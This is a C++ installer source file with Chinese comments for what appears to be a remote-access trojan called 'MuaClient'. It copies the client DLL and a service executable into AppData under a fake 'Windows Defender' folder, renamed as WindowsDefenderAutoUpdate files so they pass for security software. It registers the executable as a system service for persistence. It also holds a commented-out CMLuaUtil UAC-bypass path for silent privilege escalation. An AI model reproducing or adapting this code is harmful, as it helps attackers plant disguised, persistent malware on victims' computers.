// InstallMuaClient.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <windows.h> 
#include <shlobj.h>
#include <shlwapi.h>
#pragma comment(lib,"Shlwapi.lib")

#include "BypassUAC.h"
#include "SystemService.h"


// 安装前需要使得Install.exe, MuaClient.dll, SystemService.exe三者在同一目录下

int main()
{
	// 创建互斥量
	HANDLE hMutex = CreateMutex(NULL, TRUE, L"{EA102FF5-6BDA-41B3-BD42-028C03193095}");
	WaitForSingleObject(hMutex, INFINITE);

	WCHAR pszWillBypassUAC[] = L"{00E92116-51A2-4538-8228-03EA82922FC2}";
	WCHAR pszInstallCompleted[] = L"{FDA3820B-5558-4849-A085-D07257C2775F}";

	// 安装早已完成，直接退出
	WCHAR pszTempPathInstallCompleted[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathInstallCompleted);
	wcscat_s(pszTempPathInstallCompleted, pszInstallCompleted);
	if (PathFileExists(pszTempPathInstallCompleted)) {
		return -1;
	}

	WCHAR pszTempPathWillBypassUAC[MAX_PATH];
	GetTempPath(MAX_PATH, pszTempPathWillBypassUAC);
	wcscat_s(pszTempPathWillBypassUAC, pszWillBypassUAC);

	//// 第一次，未提权
	//if (!PathFileExists(pszTempPathWillBypassUAC)) {
	//	// 创建 %TEMP%\pszWillBypassUAC 文件，表示即将BypassUAC
	//	HANDLE hFile = CreateFile(pszTempPathWillBypassUAC, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
	//	if (hFile != nullptr) {
	//		CloseHandle(hFile);
	//	}		

	//	// 本程序所在路径
	//	WCHAR pszThisProgramPath[MAX_PATH];
	//	GetModuleFileName(NULL, pszThisProgramPath, MAX_PATH);

	//	// 提权后再次运行此程序
	//	CMLuaUtilBypassUAC(pszThisProgramPath);
	//}

	//// 非第一次，已提权
	//else {

		// 程序所在目录
		WCHAR pszFileDir[MAX_PATH];
		GetModuleFileName(NULL, pszFileDir, MAX_PATH);
		WCHAR *pPos = NULL;
		pPos = wcsrchr(pszFileDir, '\\');
		*pPos = NULL;

		WCHAR pszMuaClientDllPath[MAX_PATH];
		WCHAR pszSystemServiceExePath[MAX_PATH];
		wcscpy_s(pszMuaClientDllPath, pszFileDir);
		wcscpy_s(pszSystemServiceExePath, pszFileDir);

		// 拼接成MuaClient.dll和SystemService.exe的路径
		wcscat_s(pszMuaClientDllPath, L"\\MuaClient.dll");
		wcscat_s(pszSystemServiceExePath, L"\\SystemService.exe");

		// MuaClient.dll和SystemService.exe不在当前目录则退出安装程序
		if (!(PathFileExists(pszMuaClientDllPath) && PathFileExists(pszSystemServiceExePath))){
			return -1;
		}

		// C:\Users\iyzyi\AppData\Roaming
		WCHAR pszNewMuaClientDllPath[MAX_PATH];
		WCHAR pszNewSystemServiceExePath[MAX_PATH];
		SHGetSpecialFolderPath(NULL, pszNewMuaClientDllPath, CSIDL_APPDATA, FALSE);
		SHGetSpecialFolderPath(NULL, pszNewSystemServiceExePath, CSIDL_APPDATA, FALSE);

		// C:\Users\iyzyi\AppData\Roaming\Windows Defender
		wcscat_s(pszNewMuaClientDllPath, L"\\Windows Defender");
		wcscat_s(pszNewSystemServiceExePath, L"\\Windows Defender");
		if (!PathIsDirectory(pszNewMuaClientDllPath)) {			//不存在则创建文件夹
			CreateDirectory(pszNewMuaClientDllPath, NULL);
		}

		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.dll
		wcscat_s(pszNewMuaClientDllPath, L"\\WindowsDefenderAutoUpdate.dll");	
		// C:\Users\iyzyi\AppData\Roaming\Windows Defender\WindowsDefenderAutoUpdate.exe
		wcscat_s(pszNewSystemServiceExePath, L"\\WindowsDefenderAutoUpdate.exe");

		// 第三个参数表示覆盖旧文件
		CopyFile(pszMuaClientDllPath, pszNewMuaClientDllPath, FALSE);
		CopyFile(pszSystemServiceExePath, pszNewSystemServiceExePath, FALSE);


		// 注册系统服务
		RegisterSystemService(pszNewSystemServiceExePath);
		
		//删掉这个用于表示BypassUAC的文件
		if (PathFileExists(pszTempPathWillBypassUAC)) {
			DeleteFile(pszTempPathWillBypassUAC);
		}
			
		// 这里暂时注释，等完成install的代码后，再解开注释
		//// 安装完了，创建 %TEMP%\pszInstallCompleted文件
		//HANDLE hFile = CreateFile(pszTempPathInstallCompleted, GENERIC_READ, FILE_SHARE_READ, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		//if (hFile != nullptr) {
		//	CloseHandle(hFile);
		//}
	

	//}

	// 释放互斥量
	ReleaseMutex(hMutex);
	CloseHandle(hMutex);
	hMutex = nullptr;


	system("pause");
}